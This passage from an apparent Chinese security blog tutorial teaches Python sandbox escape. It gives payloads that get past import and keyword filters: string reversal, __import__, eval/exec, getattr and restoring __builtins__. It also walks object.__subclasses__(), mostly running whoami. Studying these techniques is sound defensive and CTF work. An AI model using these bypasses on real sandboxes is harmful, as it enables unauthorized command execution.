<span class="hljs-string">&#x27;pymacaroons&#x27;</span>, <span class="hljs-string">&#x27;xmlrpc&#x27;</span>, <span class="hljs-string">&#x27;_testmultiphase&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;pyrfc3339&#x27;</span>, <span class="hljs-string">&#x27;xxlimited&#x27;</span>, <span class="hljs-string">&#x27;_thread&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;pytz&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;queue&#x27;</span>, <span class="hljs-string">&#x27;yaml&#x27;</span>, <span class="hljs-string">&#x27;_tracemalloc&#x27;</span>, <span class="hljs-string">&#x27;gi&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;zipapp&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;gtweak&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_yaml&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;reportlab&#x27;</span>, <span class="hljs-string">&#x27;zope&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;reprlib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span><br>]<br><br>methods = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br><br>results = &#123;&#125;<br><span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> all_modules_Python3:<br>    results[module] = &#123;<br>        <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;result&#x27;</span>: &#123;&#125;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        m = <span class="hljs-built_in">__import__</span>(module)<br>        attrs = <span class="hljs-built_in">dir</span>(m)<br>        <span class="hljs-keyword">for</span> method <span class="hljs-keyword">in</span> methods:<br>            <span class="hljs-keyword">if</span> method <span class="hljs-keyword">in</span> attrs:<br>                result = <span class="hljs-string">&#x27;yes&#x27;</span><br>                results[module][<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                result = <span class="hljs-string">&#x27;no&#x27;</span><br><br>            results[module][<span class="hljs-string">&#x27;result&#x27;</span>][method] = result<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-keyword">if</span> results[result][<span class="hljs-string">&#x27;flag&#x27;</span>]:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]&#x27;</span> + result)<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results[result][<span class="hljs-string">&#x27;result&#x27;</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;  [-]&#x27;</span> + r + <span class="hljs-string">&#x27;: &#x27;</span> + results[result][<span class="hljs-string">&#x27;result&#x27;</span>][r])<br></code></pre></td></tr></table></figure><p>效果是这样：</p><img src="/blog/2025/01/24/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20250124202651867.png" class title="image-20250124202651867"><h2 id="禁止import-os"><a href="#禁止import-os" class="headerlink" title="禁止import os"></a>禁止import os</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span>   os<br><span class="hljs-keyword">or</span><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">import</span> importlib<br>importlib.import_module(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">import</span> imp<br><br><span class="hljs-comment"># 查找 &#x27;os&#x27; 模块</span><br>file, path, description = imp.find_module(<span class="hljs-string">&#x27;os&#x27;</span>)<br><span class="hljs-comment"># 加载 &#x27;os&#x27; 模块</span><br>os_module = imp.load_module(<span class="hljs-string">&#x27;os&#x27;</span>, file, path, description)<br><span class="hljs-comment"># 访问 &#x27;os&#x27; 模块中的 &#x27;system&#x27; 函数</span><br>os_module.system(<span class="hljs-string">&#x27;echo Hello, World!&#x27;</span>)<br><span class="hljs-keyword">or</span><br>execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)<br>system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-keyword">or</span><br><span class="hljs-comment">#通用</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/usr/lib/python3.11/os.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">exec</span>(f.read())<br>system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>如果禁用了import os，可以使用空格绕过，如果空格被过滤，可以尝试<code>__import__</code>：<code>__import__(&#39;os&#39;)</code>，<code>__import__</code>被禁了还有 <code>importlib</code>(Python3.x)，imp(Python2.x)，execfile()（Python2.x）等等</p><p>最后两种方法都需要库的路径一般情况下都是默认的，还有方法找路径的话就是用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-built_in">print</span>(sys.path)<br></code></pre></td></tr></table></figure><h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-string">&#x27;o&#x27;</span><br>a = <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-built_in">__import__</span>(a+b).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还可以利用 <code>eval</code> 或者 <code>exec</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])<br>yankun\administrator<br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="hljs-number">1</span>])<br>yankun\administrator<br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>对于绕过操作还有很多比如说：逆序、变量拼接、base64、hex、rot13等等</p><h2 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h2><p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是<strong>刚启动</strong>的话，所列出的模块就是解释器在<strong>启动时自动加载的模块</strong>。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p><p>如果将 os 从 sys.modules 中剔除或者改变，os 就彻底没法用了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> os<br><span class="hljs-meta">&gt;&gt;&gt; </span>os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span><br>AttributeError: <span class="hljs-string">&#x27;str&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;system&#x27;</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>假如遇到上面这种让os模块成了字符串，绕过思路就是将其删除掉，重新加载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><span class="hljs-comment"># </span><br><br><span class="hljs-keyword">del</span> sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>]<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h2><p>通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法<strong>直接做编码</strong>等等操作。</p><p>不过，要明确的是，os 中能够执行系统命令的函数有很多：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br><span class="hljs-built_in">print</span>(os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <br><span class="hljs-built_in">print</span>(os.popen2(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br><span class="hljs-built_in">print</span>(os.popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br><span class="hljs-built_in">print</span>(os.popen4(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br></code></pre></td></tr></table></figure><p>应该还有一些，可以在这里找找：</p><ol><li>Python2.x ：<a href="https://docs.python.org/2/library/os.html">https://docs.python.org/2/library/os.html</a></li><li>Python3.x ：<a href="https://docs.python.org/3/library/os.html">https://docs.python.org/3/library/os.html</a></li></ol><h2 id="其次，可以通过-getattr拿到对象的方法、属性："><a href="#其次，可以通过-getattr拿到对象的方法、属性：" class="headerlink" title="其次，可以通过 getattr拿到对象的方法、属性："></a>其次，可以通过 getattr拿到对象的方法、属性：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> os<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-keyword">or</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(__builtins__, <span class="hljs-string">&#x27;__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性&#x2F;方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。</p><h2 id="builtin-，builtins与-builtins"><a href="#builtin-，builtins与-builtins" class="headerlink" title="__builtin__，builtins与__builtins__"></a><code>__builtin__</code>，<code>builtins</code>与<code>__builtins__</code></h2><p>在python2.x的版本中，内置模块被命名为了<code>__builtin__</code>，到了python3.x就成了builtins都需要将其导入才能查看：</p><p>2.x:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> __builtin__<br><span class="hljs-meta">&gt;&gt;&gt; </span>__builtin__<br>&lt;module <span class="hljs-string">&#x27;__builtin__&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure><p>3.x：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> builtins<br><span class="hljs-meta">&gt;&gt;&gt; </span>builtins<br>&lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure><p><code>__builtins__</code>实际就是<code>__builtin__</code>，<code>builtins</code>的引用，它不需要导入即可使用，但是<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>还是有一个小区别，就是在局部的作用域中（一个函数内部，比如说<code> print(eval(inp, &#123;&quot;__builtins__&quot;: None, &#39;f&#39;: f, &#39;eval&#39;: ev4l&#125;))</code>）<code>__builtins__</code> 就是是一个字典类似于<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身。还有我觉得有必要了解下Python 对函数、变量、类等等的查找方式是按 LEGB 规则来找的。</p><h3 id="那什么是LEGB呢？"><a href="#那什么是LEGB呢？" class="headerlink" title="那什么是LEGB呢？"></a>那什么是LEGB呢？</h3><ol><li>L（Local）——局部作用域<ul><li>当前函数或代码块内部定义的变量。</li><li>如果在函数内定义了一个变量，Python 首先会在当前函数的局部作用域内查找。</li></ul></li><li>E（Enclosing）——闭包函数外的局部作用域<ul><li>如果局部作用域中没有找到变量，Python 会查找<strong>外层函数</strong>（即闭包）中定义的变量。</li><li>适用于嵌套函数的场景，即函数内部定义了另一个函数。</li></ul></li><li>G（Global）——全局作用域<ul><li>如果在局部和闭包作用域中都找不到变量，Python 会查找模块的全局作用域。</li><li>全局作用域中的变量通常定义在脚本的顶层，或者是 <code>global</code> 声明的变量。</li></ul></li><li>B（Built-in）——内置作用域<ul><li>如果上述作用域都找不到变量，Python 会在内置作用域中查找。</li><li>内置作用域包含 Python 语言提供的内置函数和变量，例如 <code>len()</code>、<code>print()</code> 和 <code>Exception</code>。</li></ul></li></ol><h4 id="查找顺序："><a href="#查找顺序：" class="headerlink" title="查找顺序："></a>查找顺序：</h4><p>Python 遇到变量时会按照 <strong>L → E → G → B</strong> 的顺序依次查找，直到找到匹配的变量为止。如果所有作用域都找不到，会抛出 <code>NameError</code>。</p><p>回归话题<code>__builtins__</code>有很多有意思的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;__import__&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;execfile&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>如果遇到将<code>__builtins__</code>里面的危险函数删除又该如何绕过嘞？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.__dict__[<span class="hljs-string">&#x27;eval&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">del</span> __builtins__.__dict__[<span class="hljs-string">&#x27;eval&#x27;</span>]<br></code></pre></td></tr></table></figure><p>可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。但是，我们在使用 <code>reload</code> 的时候也没导入，说明<code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。</p><p>注意：2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code></p><h2 id="继承关系绕过"><a href="#继承关系绕过" class="headerlink" title="继承关系绕过"></a>继承关系绕过</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>其中<code>__mro__</code>，是个元组，记录了继承关系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>:<br><span class="hljs-meta">... </span><span class="hljs-keyword">pass</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>test.__bases__<br>()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-meta">... </span><span class="hljs-keyword">pass</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>test.__bases__<br>(<span class="hljs-string">&#x27;object&#x27;</span>&gt;,)<br></code></pre></td></tr></table></figure><p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>&#39;&#39;</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p><p>由于：没法直接引入 os，那么假如有个库叫A，在A中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os（<code>__globals__</code>是函数所在的全局命名空间中所定义的全局变量）。例如，<code>site</code> 这个库就有 <code>os</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> site<br><span class="hljs-meta">&gt;&gt;&gt; </span>site.os<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure><p>也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> site<br><span class="hljs-meta">&gt;&gt;&gt; </span>os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span><br>NameError: name <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> defined<br><span class="hljs-meta">&gt;&gt;&gt; </span>os = reload(site.os)<br><span class="hljs-meta">&gt;&gt;&gt; </span>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>所有类都继承object，那么看看他的子类(Python2.x)，（Python3.x，<code>for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print(i)</code>）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()): <span class="hljs-built_in">print</span> i<br><span class="hljs-meta">... </span><br>(<span class="hljs-number">0</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;)<br>(<span class="hljs-number">1</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;)<br>(<span class="hljs-number">2</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">3</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">4</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;)<br>(<span class="hljs-number">5</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;)<br>(<span class="hljs-number">6</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;)<br>(<span class="hljs-number">7</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;)<br>(<span class="hljs-number">8</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;)<br>(<span class="hljs-number">9</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;)<br>(<span class="hljs-number">10</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;)<br>(<span class="hljs-number">11</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;)<br>(<span class="hljs-number">12</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;)<br>(<span class="hljs-number">13</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;)<br>(<span class="hljs-number">14</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;)<br>(<span class="hljs-number">15</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;)<br>(<span class="hljs-number">16</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">17</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;)<br>(<span class="hljs-number">18</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;)<br>(<span class="hljs-number">19</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;)<br>(<span class="hljs-number">20</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;)<br>(<span class="hljs-number">21</span>, &lt;<span class="hljs-built_in">type</span> <span 